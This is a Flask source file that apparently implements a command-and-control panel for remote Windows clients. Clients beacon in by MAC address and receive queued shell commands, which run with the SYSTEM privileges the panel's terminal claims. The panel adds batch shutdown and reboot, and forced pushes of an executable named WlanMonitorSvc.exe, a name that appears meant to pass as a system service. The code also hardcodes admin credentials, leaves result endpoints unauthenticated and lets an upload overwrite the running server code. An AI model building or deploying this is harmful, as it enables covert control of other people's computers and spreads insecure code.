from flask import Flask, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify
from datetime import datetime
import os
import json

app = Flask(__name__)
app.secret_key = 'super_secret_gardenia_key'

USERNAME = 'gardenia'
PASSWORD = '7852136fgU'

UPDATE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(UPDATE_DIR, 'clients.json')

VERSION_FILE = os.path.join(UPDATE_DIR, 'version.txt')
if not os.path.exists(VERSION_FILE):
    with open(VERSION_FILE, 'w', encoding='utf-8') as f:
        f.write("1.0.4")

if os.path.exists(DB_FILE):
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try:
            clients_db = json.load(f)
        except:
            clients_db = {}
else:
    clients_db = {}

def save_db():
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(clients_db, f, ensure_ascii=False)

def is_online(last_seen_str):
    try:
        last_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
        return (datetime.now() - last_dt).total_seconds() < 15
    except:
        return False

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == USERNAME and request.form.get('password') == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            return "账号或密码错误！<a href='/login'>返回重试</a>"
    return '''
    <body style="background:#f0f2f5; font-family:sans-serif;">
        <form method="post" style="max-width:300px; margin:100px auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); text-align:center;">
            <h2>后台管理登录</h2>
            <input type="text" name="username" placeholder="账号" style="width:100%; padding:10px; margin-bottom:15px; box-sizing:border-box;" required>
            <input type="password" name="password" placeholder="密码" style="width:100%; padding:10px; margin-bottom:15px; box-sizing:border-box;" required>
            <button type="submit" style="width:100%; padding:10px; background:#007bff; color:#fff; border:none; border-radius:5px; cursor:pointer;">登录</button>
        </form>
    </body>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/report', methods=['GET'])
def report_client():
    mac = request.args.get('mac')
    ver = request.args.get('ver')
    if mac and ver:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if mac not in clients_db:
            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str}
        else:
            clients_db[mac]["ver"] = ver
            clients_db[mac]["last_seen"] = time_str
            if "name" not in clients_db[mac]:
                clients_db[mac]["name"] = "未命名设备"

        # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
        pending_cmd = clients_db[mac].get('pending_cmd', '')
        if pending_cmd:
            clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
            save_db()
            return pending_cmd, 200

        save_db()
        return "SSID:" + clients_db[mac].get('name', '未命名设备'), 200

    return "Missing parameters", 400

@app.route('/cmd_result', methods=['POST'])
def cmd_result():
    mac = request.form.get('mac')
    output = request.form.get('output')
    if mac in clients_db:
        # 将最新的结果自动往后追加到这段历史记录里，并且截断过长的历史以节省空间
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"{output}\n")[-50000:]
        clients_db[mac]['is_executing'] = False
        save_db()
    return "OK", 200

@app.route('/api/rename', methods=['POST'])
def api_rename():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    new_name = data.get('name')
    if mac in clients_db:
        clients_db[mac]['name'] = new_name
        save_db()
    return jsonify({"status": "ok"})

@app.route('/api/send_cmd', methods=['POST'])
def api_send_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')
    if mac in clients_db:
        clients_db[mac]['pending_cmd'] = cmd
        name = clients_db[mac].get('name', '未命名设备')
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
        clients_db[mac]['is_executing'] = True
        save_db()
    return jsonify({"status": "ok"})

@app.route('/api/batch_cmd', methods=['POST'])
def api_batch_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    macs = data.get('macs', [])
    cmd = data.get('cmd', '')
    for mac in macs:
        if mac in clients_db:
            clients_db[mac]['pending_cmd'] = cmd
            name = clients_db[mac].get('name', '未命名设备')
            clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
            clients_db[mac]['is_executing'] = True
    save_db()
    return jsonify({"status": "ok"})

@app.route('/api/get_cmd_result/<mac>')
def api_get_cmd_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        hist = clients_db[mac].get('terminal_history', '尚未有历史执行记录\n')
        if clients_db[mac].get('is_executing', False):
            hist += "[系统指令已下发，等待终端执行与响应返回...] \n"
        return jsonify({"output": hist, "status": "ok"})
    return jsonify({"status": "not found"})

@app.route('/update_mgmt', methods=['POST'])
def update_mgmt():
    if not session.get('logged_in'): return redirect(url_for('login'))
    new_ver = request.form.get('version')
    uploaded_file = request.files.get('file')

    if new_ver:
        with open(VERSION_FILE, 'w', encoding='utf-8') as f:
            f.write(new_ver.strip())
    if uploaded_file and uploaded_file.filename != '':
        uploaded_file.save(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))

    # 下发全局紧急更新通知给所有在线设备
    for mac, info in clients_db.items():
        if is_online(info.get('last_seen', '')):
            clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
    save_db()

    return redirect(url_for('index'))

@app.route('/update_server', methods=['POST'])
def update_server():
    if not session.get('logged_in'): return redirect(url_for('login'))
    uploaded_app = request.files.get('app_file')

    if uploaded_app and uploaded_app.filename != '':
        uploaded_app.save(os.path.abspath(__file__))
        import threading
        import sys
        import time
        def restart_server():
            time.sleep(1) # 稍微延迟一下确保前端已经得到响应
            os.execv(sys.executable, [sys.executable] + sys.argv)
        threading.Thread(target=restart_server).start()

    return redirect(url_for('index'))

@app.route('/update/<filename>')
def serve_update(filename):
    if filename not in ['version.txt', 'WlanMonitorSvc.exe']:
        return "拒绝访问", 403
    return send_from_directory(UPDATE_DIR, filename)

@app.route('/terminal/<mac>')
def terminal_page(mac):
    if not session.get('logged_in'): return redirect(url_for('login'))
    if mac not in clients_db: return "设备不存在"
    
    TERMINAL_HTML = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <title>终端 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #000; color: #00ff00; font-family: Consolas, monospace; padding: 20px; margin: 0; }
            #output { font-family: Consolas; white-space: pre-wrap; word-wrap: break-word; padding-bottom: 20px; }
            .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between;}
            .header a { color: #aaa; text-decoration: none; }
            .header a:hover { color: #fff; }
            .input-area { display: flex; position: fixed; bottom: 0; left: 0; right: 0; background: #111; padding: 10px; border-top: 1px solid #333; }
            .input-area input { flex-grow: 1; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: Consolas; outline: none;}
            .input-area button { background: #00ff00; color: #000; font-weight: bold; border: none; padding: 0 20px; cursor: pointer; margin-left:10px; }
            .input-area button:hover { background: #00cc00; }
            .sys-msg { color: #888; }
        </style>
    </head>
    <body>
        <div class="header">
            <span>>_ {{ info.name }}  [{{ mac }}] 的安全终端交互界面 (SYSTEM权限)</span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div id="output"><span class="sys-msg">正在链接受控端，获取最后输出缓冲...</span></div>
        <br><br><br>
        <div class="input-area">
            <span style="padding: 10px 5px 10px 10px;">root@{{ info.name }}:~#</span>
            <input type="text" id="cmd" placeholder="输入CMD系统命令 (例如 whoami 或 ipconfig)，按回车发送..." onkeydown="if(event.keyCode==13) sendCmd()">
            <button onclick="sendCmd()">发送</button>
            <button onclick="window.location.href='/'" style="background: #6c757d; color: #fff; margin-left: 10px;">返回列表</button>
        </div>

        <script>
            function fetchOutput() {
                fetch('/api/get_cmd_result/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    if(data.status === 'ok') {
                        var el = document.getElementById('output');
                        if (el.textContent !== data.output) {
                            var isScrolledToBottom = (window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 50);
                            el.textContent = data.output;
                            if (isScrolledToBottom) {
                                window.scrollTo(0, document.body.scrollHeight);
                            }
                        }
                    }
                });
            }
            setInterval(fetchOutput, 2000);
            fetchOutput();

            function sendCmd() {
                var cmd = document.getElementById('cmd').value;
                if(!cmd) return;
                document.getElementById('cmd').value = '';

                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(() => fetchOutput()); // 发送后直接立即拉取渲染一下执行状态
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(TERMINAL_HTML, mac=mac, info=clients_db[mac])

# 抽离表格的HTML，供前端 AJAX 每隔几秒拉取实现真正的无感“实时在线状态更新”
@app.route('/tables_partial')
def tables_partial():
    if not session.get('logged_in'): return "未登录"
    
    online_clients = {k: v for k, v in clients_db.items() if is_online(v.get('last_seen', ''))}
    offline_clients = {k: v for k, v in clients_db.items() if not is_online(v.get('last_seen', ''))}
    
    PARTIAL_HTML = """
    <h3>🟢 活跃在线设备列表 [ {{ online_clients|length }} 台 ]</h3>
    <table>
        <thead>
            <tr>
                <th><input type="checkbox" id="checkAll" onclick="toggleAll(this)"></th>
                <th>MAC 地址</th>
                <th>设备备注名</th>
                <th>当前运行版本</th>
                <th>最后心跳时间</th>
                <th>快速操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in online_clients.items() %}
            <tr>
                <td><input type="checkbox" class="client-check" value="{{ mac }}"></td>
                <td><code>{{ mac }}</code></td>
                <td>
                    {{ info.name }} 
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td>v{{ info.ver }}</td>
                <td>{{ info.last_seen }}</td>
                <td>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /r /t 0')" style="background:#ffc107; color:#000; padding:4px 8px; font-size:12px;">重启</button>
                    <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
                </td>
                <td class="status-online">📡 在线</td>
            </tr>
            {% else %}
            <tr><td colspan="7" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
            {% endfor %}
        </tbody>
    </table>

    <div style="margin-bottom: 30px; background: #e9ecef; padding: 15px; border-radius: 8px;">
        <b>⚡ 批量操作 (已选设备):</b>
        <button onclick="batchCmd('shutdown /s /t 0')" style="background:#dc3545; margin-left:10px;">批量关机</button>
        <button onclick="batchCmd('shutdown /r /t 0')" style="background:#ffc107; color:#000; margin-left:10px;">批量重启</button>
        <button onclick="batchCmd('UPDATE_NOW')" style="background:#28a745; margin-left:10px;">强制检查更新</button>
    </div>

    <h3>🔴 离线设备记录 [ {{ offline_clients|length }} 台 ]</h3>
    <table>
        <thead>
            <tr>
                <th>MAC 地址</th>
                <th>最后已知名称</th>
                <th>离线前版本</th>
                <th>最近一次连接时间</th>
                <th>操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in offline_clients.items() %}
            <tr>
                <td style="color:#777;"><code>{{ mac }}</code></td>
                <td style="color:#777;">
                    {{ info.name }}
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td style="color:#777;">v{{ info.ver }}</td>
                <td style="color:#777;">{{ info.last_seen }}</td>
                <td><a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px;">📝 查看遗留日志</a></td>
                <td class="status-offline">已离线</td>
            </tr>
            {% else %}
            <tr><td colspan="6" style="text-align: center; color: #888;">暂无离线历史记录</td></tr>
            {% endfor %}
        </tbody>
    </table>
    """
    return render_template_string(PARTIAL_HTML, online_clients=online_clients, offline_clients=offline_clients)

@app.route('/', methods=['GET'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
        
    current_server_version = "未知版本"
    if os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, 'r', encoding='utf-8') as f:
            current_server_version = f.read().strip()

    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>控制台设备管理</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
            .container { max-width: 1100px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; margin-top: 10px; margin-bottom: 30px; }
            th, td { padding: 12px 15px; border-bottom: 1px solid #ddd; text-align: left; }
            th { background-color: #007bff; color: white; }
            tr:hover { background-color: #f1f1f1; }
            .status-online { color: #28a745; font-weight: bold; }
            .status-offline { color: #dc3545; font-weight: bold; }
            .mgmt-box { background: #e9ecef; padding: 20px; border-radius: 8px; margin-bottom: 30px; }
            input[type="text"], input[type="file"] { padding: 8px; margin-right: 10px; border: 1px solid #ccc; border-radius:4px;}
            button { padding: 8px 15px; background: #007bff; border: none; border-radius: 4px; cursor: pointer; color: white;}
            button:hover { background: #0056b3; }
            .logout { float: right; padding:8px 15px; background: #dc3545; border-radius: 4px; text-decoration: none; color: #fff;}
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/logout" class="logout">注销退出</a>
            <h1 style="margin-top:0;">💻 设备综合管理后台</h1>
            
            <div class="mgmt-box">
                <h3 style="margin-top:0;">🛠 发布强制客户端更新</h3>
                <p>当前全网服务器提供的最新强制更新版本号：<b style="color:red; font-size:18px;">{{ current_server_version }}</b></p>
                <form action="/update_mgmt" method="post" enctype="multipart/form-data">
                    <label>1. 发布新版本号(填入更高版本号单下发更新通知):</label><br>
                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 10px 0; width: 250px;">
                    <br>
                    <label>2. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
                    <input type="file" name="file" accept=".exe" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">更新并发布推送全网</button>
                </form>

                <hr style="border: 1px solid #ccc; margin: 20px 0;">

                <h3 style="margin-top:0;">⚙️ 热更新服务端代码</h3>
                <form action="/update_server" method="post" enctype="multipart/form-data">
                    <label>上传新的 app.py 后将直接覆盖并立即重启当前服务端进程:</label><br>
                    <input type="file" name="app_file" accept=".py" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#17a2b8; padding: 10px 20px; margin-top:5px;">只热更新服务端(app.py)</button>
                </form>
            </div>

            <!-- 数据列表挂载容器 -->
            <div id="target-tables">正在建立实时通信环境获取设备库并连接设备...</div>

        </div>

        <script>
            // 定时使用 AJAX 异步拉取表格更新，达到实时无感动态列表
            function fetchTables() {
                // 1. 保存当前勾选的设备MAC
                var checkedMacs = [];
                var checkboxes = document.querySelectorAll('.client-check:checked');
                checkboxes.forEach(c => checkedMacs.push(c.value));

                fetch('/tables_partial')
                    .then(response => response.text())
                    .then(html => {
                        document.getElementById('target-tables').innerHTML = html;

                        // 2. 渲染新表格后恢复勾选状态
                        var newCheckboxes = document.querySelectorAll('.client-check');
                        var checkCount = 0;
                        newCheckboxes.forEach(c => {
                            if (checkedMacs.includes(c.value)) {
                                c.checked = true;
                                checkCount++;
                            }
                        });

                        // 3. 恢复顶部全选框的显示状态
                        var checkAllBtn = document.getElementById('checkAll');
                        if (checkAllBtn && newCheckboxes.length > 0 && checkCount === newCheckboxes.length) {
                            checkAllBtn.checked = true;
                        }
                    });
            }

            // 初始化立即加载，然后每间隔 3 秒刷一次
            fetchTables();
            setInterval(fetchTables, 3000);

            // 通过 JS 发送重命名更新（防止由于全页面刷新打断用户填写或者页面滚动异常）
            window.promptRename = function(mac, oldname) {
                var newname = prompt("给该设备重命名为:", oldname);
                if(newname && newname !== oldname) {
                    fetch('/api/rename', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ mac: mac, name: newname })
                    }).then(() => {
                        fetchTables(); // 直接刷新列表看到新名称
                    });
                }
            };

            window.toggleAll = function(source) {
                var checkboxes = document.querySelectorAll('.client-check');
                for(var i=0; i<checkboxes.length; i++) checkboxes[i].checked = source.checked;
            };

            window.quickCmd = function(mac, cmd) {
                if(!confirm("确定要对该机器执行: " + cmd + " 吗？")) return;
                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: mac, cmd: cmd})
                }).then(() => alert("已下发"));
            };

            window.batchCmd = function(cmd) {
                var checked = document.querySelectorAll('.client-check:checked');
                var macs = [];
                checked.forEach(c => macs.push(c.value));
                if(macs.length === 0) return alert("请先勾选需要的设备");
                if(!confirm("确定要对选中的 " + macs.length + " 台机器执行: " + cmd + " 吗？")) return;

                fetch('/api/batch_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({macs: macs, cmd: cmd})
                }).then(() => alert("批量指令已下发"));
            };
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, current_server_version=current_server_version)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
